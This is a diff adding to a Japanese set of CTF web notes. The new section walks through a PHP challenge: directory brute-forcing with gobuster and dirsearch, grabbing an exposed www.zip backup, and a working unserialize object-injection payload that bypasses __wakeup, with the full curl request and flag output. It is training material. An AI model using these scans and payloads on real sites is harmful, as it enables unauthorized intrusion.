@@ -1,9 +1,6 @@
 <!-- START doctoc generated TOC please keep comment here to allow auto update -->
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 
-# CTF web
-
-過去に開催されたCTFのweb問を解いてます。write upというよりメモなのでめちゃくちゃ適当です。
 
 - [[HCTF 2018]WarmUp](#hctf-2018warmup)
 - [[强网杯 2019]随便注](#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8)
@@ -17,6 +14,7 @@
 - [[ACTF2020 新生赛]Include](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Binclude)
 - [[HCTF 2018]admin](#hctf-2018admin)
 - [[GXYCTF2019]Ping Ping Ping](#gxyctf2019ping-ping-ping)
+- [[极客大挑战 2019]PHP](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -500,3 +498,226 @@ $flag = "flag{06c6b77d-475b-402a-aa5d-1df566f1cdf2}";
 ```
 
 他にもhexやoctに変換してflagが禁止されているのをbypassできる。
+
+# [极客大挑战 2019]PHP
+
+```
+$ gobuster dir -u f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn -w /usr/share/dirb/wordlists/big.txt -t 50 -q -x php,html,txt,bak
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/class.php (Status: 200)
+```
+
+gobusterでenumerateしたが、429 Too Many Requestsが返ってきたのでうまくできずにdirsearch.pyでdelayを2にしたところうまくスキャンできた気がした。
+```
+dirsearch
+    -e EXTENSIONS, --extensions=EXTENSIONS
+    -w WORDLIST, --wordlist=WORDLIST
+    -r, --recursive     Bruteforce recursively
+```
+
+```bash
+$ python3 dirsearch.py -u http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn -e php -s 2
+
+[09:20:29] Starting: 
+[09:22:54] 403 -  332B  - /.htaccess-dev                              
+[09:22:55] 403 -  334B  - /.htaccess-marco
+[09:22:55] 403 -  334B  - /.htaccess-local
+[09:22:56] 403 -  333B  - /.htaccess.bak1
+[09:22:57] 403 -  333B  - /.htaccess.orig
+[09:22:57] 403 -  335B  - /.htaccess.sample
+[09:22:57] 403 -  332B  - /.htaccess.old
+[09:22:57] 403 -  332B  - /.htaccess.txt
+[09:22:58] 403 -  333B  - /.htaccess.save
+[09:22:58] 403 -  331B  - /.htaccessBAK
+[09:22:58] 403 -  331B  - /.htaccessOLD
+[09:22:58] 403 -  332B  - /.htaccessOLD2
+[09:22:59] 403 -  332B  - /.htpasswd-old  
+[09:23:00] 403 -  330B  - /.httr-oauth
+[09:25:22] 400 -  154B  - /%2e%2e/google.com                        
+[09:32:20] 403 -  327B  - /cgi-bin/                                     
+[09:35:16] 403 -  325B  - /error/                                              
+[09:37:18] 200 -    2KB - /index.php                          
+[09:37:22] 200 -    2KB - /index.php/login/
+[09:49:21] 200 -    6KB - /www.zip    
+```
+```bash
+$ wget http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn/www.zip
+--2020-08-13 09:11:19--  http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn/www.zip
+Resolving f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn (f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn)... 111.73.46.229
+Connecting to f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn (f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn)|111.73.46.229|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5941 (5.8K) [application/zip]
+Saving to: ‘www.zip’
+
+www.zip              100%[===================>]   5.80K  --.-KB/s    in 0s      
+
+2020-08-13 09:11:20 (280 MB/s) - ‘www.zip’ saved [5941/5941]
+```
+```
+$ unzip www.zip
+Archive:  www.zip
+  inflating: index.php               
+  inflating: flag.php                
+  inflating: index.js                
+  inflating: class.php               
+  inflating: style.css               
+kali@kali:~/buuoj.cn/php$ ls
+class.php  flag.php  index.js  index.php  style.css  www.zip
+kali@kali:~/buuoj.cn/php$ cat flag.php 
+<?php
+$flag = 'Syc{dog_dog_dog_dog}';
+?>
+```
+```bash
+$ cat index.php
+
+    <?php
+    include 'class.php';
+    $select = $_GET['select'];
+    $res=unserialize(@$select);
+    ?>
+```
+```php
+$ cat class.php
+<?php
+include 'flag.php';
+
+
+error_reporting(0);
+
+
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+
+    function __wakeup(){
+        $this->username = 'guest';
+    }
+
+    function __destruct(){
+        if ($this->password != 100) {
+            echo "</br>NO!!!hacker!!!</br>";
+            echo "You name is: ";
+            echo $this->username;echo "</br>";
+            echo "You password is: ";
+            echo $this->password;echo "</br>";
+            die();
+        }
+        if ($this->username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
+            die();
+
+            
+        }
+    }
+}
+?>
+```
+
+ユーザからの任意の入力のアンシリアライズを許すことによって任意のオブジェクトを生成される脆弱性っぽい。
+
+
+
+> シリアライズとは、複数の要素を一列に並べる操作や処理のこと。単にシリアライズといった場合には、プログラムの実行状態や複雑なデータ構造などを一つの文字列やバイト列で表現する「直列化」を指すことが多い。
+
+
+> __destruct(). デストラクタは、オブジェクトが破棄されて、オブジェクトへの参照が全て無くなった場合に呼び出される後処理です。
+
+> __destruct()は、unserialize()で呼ばれるわけではなく、デシリアライズしたインスタンスの参照が0になるタイミングで実行されます。
+これは通常のクラスインスタンスと同じ挙動です。
+
+## 参考にしたサイト
+https://blog.tokumaru.org/2015/07/phpunserialize.html
+
+https://www.1x1.jp/blog/2010/11/php_unserialize_do_not_call_destruct.html
+
+http://blog.a-way-out.net/blog/2014/07/22/php-object-injection/
+
+## 任意のオブジェクトを生成する
+
+```php
+<?php
+class Name
+{
+    private $username = 'admin';
+    private $password = '100';
+}
+$a = new Name();
+echo urlencode(serialize($a));
+?>
+```
+これでいけるかと思ったら
+```
+O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
+```
+メンバ変数の数を2から3もしくはそれ以上じゃなきゃいけないとflagが表示されない
+
+```
+2を3に変更した理由は、__wakeup()関数をバイパスしてユーザ名を上書きしないようにするためで、%00はユーザ名とパスワードがプライベート変数であり、変数内のクラス名の前後に空白が生じ、コピーが失われるからです。 ペイロードを取得して提出してフラグを取得します。
+```
+
+```bash
+$ curl -i http://f9f91919-3716-48f2-a906-14c15eed7873.node3.buuoj.cn/index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
+HTTP/1.1 200 OK
+Server: openresty
+Date: Thu, 13 Aug 2020 14:42:39 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1795
+Connection: keep-alive
+X-Powered-By: PHP/5.3.3
+
+<!DOCTYPE html>
+<head>
+  <meta charset="UTF-8">
+  <title>I have a cat!</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
+      <link rel="stylesheet" href="style.css">
+</head>
+<style>
+    #login{   
+        position: absolute;   
+        top: 50%;   
+        left:50%;   
+        margin: -150px 0 0 -150px;   
+        width: 300px;   
+        height: 300px;   
+    }   
+    h4{   
+        font-size: 2em;   
+        margin: 0.67em 0;   
+    }
+</style>
+<body>
+
+
+
+
+
+
+
+<div id="world">
+    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
+    </div>
+    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
+    </div>
+    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
+    flag{5f7c3db5-1edb-4f0c-abe7-ca38b6460fea}    </div>
+    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
+</div>
+<script src='http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'></script>
+<script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
+<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'></script>
+<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'></script>
+<script  src="index.js"></script>
+</body>
+</html>
+```
